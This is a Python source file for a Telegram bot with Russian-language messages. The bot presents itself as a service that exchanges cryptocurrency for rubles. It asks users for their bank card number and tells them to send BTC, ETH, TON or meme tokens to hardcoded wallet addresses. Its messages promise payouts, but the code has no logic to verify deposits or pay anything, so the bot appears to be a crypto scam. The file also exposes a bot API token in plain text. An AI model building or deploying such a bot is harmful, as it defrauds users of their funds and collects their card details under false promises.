from telebot import*
import random
a = True
bot = telebot.TeleBot('7364990481:AAG_6PdntIcEkO-J3JBFKYDiZZi2E-EsDXA')
@bot.message_handler(commands=["start"])
def start(message):
        markup = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton('BTC', callback_data='btc')
        btn2 = types.InlineKeyboardButton('ETH', callback_data='eth')
        btn3 = types.InlineKeyboardButton('TON', callback_data='ton')
        btn4 = types.InlineKeyboardButton('HMST', callback_data='hmst')
        btn5 = types.InlineKeyboardButton('DOGS', callback_data='dogs')
        markup.row(btn1, btn2)
        markup.row(btn3, btn4, btn5)
        bot.send_message(message.chat.id,
                         'Здравтсвуйте, приветствуем вам нашего бота для обмена крипты                                                                                                                                                                               '
                         'доступны:                                                                                                                                                                                                                         '
                         'ETH ♢, BTC ₿, DOGS🐶, HMST🐹, TON 💎                                                                                                                                                                                                                         '
                         'САМОЕ ГЛАВНОЕ!!! бот скинет деньги если сумма криптовалюты составляет от 5$                                                                                                                                                                                                                 '
                         'Если что-то не будете понимать можете нажать /help бот объяснит что нужно делать                                                                                                                                                                                             '
                         'Выберите что хотите обменять:', reply_markup=markup)


@bot.message_handler(commands=["help"])
def start(message):
        bot.send_message(message.chat.id, "Помощь по обмену:                                                                                                                                                                     "
                                      "Чтобы обменять крипту на рубли следуйте пунктам                                                                                                                                                        "
                                      "1.Нажмите на комманду /start                                                                                                                                                                            "
                                      "2.Выберите криптовалюту для обмена                                                                                                                                                                                  "
                                      "3.Напишите боту номер своей банковской карты                                                                                                                                                                  "
                                      "4.Скиньте криптовалюту по указанному кошельку с указанным комментарием который бот вам отправит                                                                                                                                                            "
                                      "5.Ожидайте проверки бота и вывода средств на банковсую карту🤑🤑🤑                                                                                                                                                        "
                                      "Надеюсь хорошо объяснил хорошего вывода")


@bot.callback_query_handler(lambda callback: True)
def callback_message(callback):
    if callback.data == "btc":
        bot.delete_message(callback.message.chat.id, callback.message.message_id)
        bot.send_message(callback.message.chat.id, f"Адрес BTC: `bc1qpv6dggxdefejrg8cur8224sjwjpayx6q2dtd30`                                                                                                                                                        напишите свою карту                                                                                        "
                                                   "Адрес и комментарий копируются при нажатии                                                                    напишите свою карту а потом отправьте криптовалюту по указанному адресу и напишите комментарий чтобы мы знали кому отправлять деньги", parse_mode='MarkdownV2')
        bot.send_message(callback.message.chat.id, f'комментарий: `{random.randint(100000, 999999)}`', parse_mode='MarkdownV2')
        a = False
        a = True
    elif callback.data == 'dogs':
        bot.delete_message(callback.message.chat.id, callback.message.message_id)
        bot.send_message(callback.message.chat.id, "Адрес Dogs: `UQBWBid7uy5JQr-8G3mO4Hd8clizTWFbPcAiRV75pRQaKEni`                                                                                                                                                                                         "
                                                   "напишите свою карту а потом отправьте криптовалюту по указанному адресу и напишите комментарий чтобы мы знали кому отправлять деньги                                                                                                                                                Адрес и комментарий копируются при нажатии", parse_mode='MarkdownV2')
        bot.send_message(callback.message.chat.id, f'комментарий: `{random.randint(100000, 999999)}`', parse_mode='MarkdownV2')
        a = False
        a = True
    elif callback.data == 'hmst':
        bot.delete_message(callback.message.chat.id, callback.message.message_id)
        bot.send_message(callback.message.chat.id, "Адрес HMST: `UQBgOHIB5e4--rCqfyKZI2ohZrJDtzcu3o5i4PgufV9wnvba`                                                                                                                                                                           напишите свою карту                                                                               "
                                                   "   Адрес и комментарий копируются при нажатии                                                       напишите свою карту а потом отправьте криптовалюту по указанному адресу и напишите комментарий чтобы мы знали кому отправлять деньги", parse_mode='MarkdownV2')
        bot.send_message(callback.message.chat.id, f'комментарий: `{random.randint(100000, 999999)}`', parse_mode='MarkdownV2')
        a = False
        a = True
    elif callback.data == 'eth':
        bot.delete_message(callback.message.chat.id, callback.message.message_id)
        bot.send_message(callback.message.chat.id, "Адрес ETH: `0xbF20d6DB8890e3BA5430cDFC686398BCd4e1BcE4`                                                                                                                                                                                      напишите свою карту                                                                                     "
                                                   "Адрес и комментарий копируются при нажатии                                                                            напишите свою карту а потом отправьте криптовалюту по указанному адресу и напишите комментарий чтобы мы знали кому отправлять деньги", parse_mode='MarkdownV2')
        bot.send_message(callback.message.chat.id, f'комментарий: `{random.randint(100000, 999999)}`', parse_mode='MarkdownV2')
        a = False
        a = True
    elif callback.data == 'ton':
        bot.delete_message(callback.message.chat.id, callback.message.message_id)
        bot.send_message(callback.message.chat.id, "Адрес TON: `UQBgOHIB5e4--rCqfyKZI2ohZrJDtzcu3o5i4PgufV9wnvba`                                                                                                                                                                                          напишите свою карту                                                                                              "
                                                   "   Адрес и комментарий копируются при нажатии                                                                      напишите свою карту а потом отправьте криптовалюту по указанному адресу и напишите комментарий чтобы мы знали кому отправлять деньги", parse_mode='MarkdownV2')
        bot.send_message(callback.message.chat.id, f'комментарий: `{random.randint(100000, 999999)}`', parse_mode='MarkdownV2')
        a = False
        a = True








bot.polling(non_stop=a)
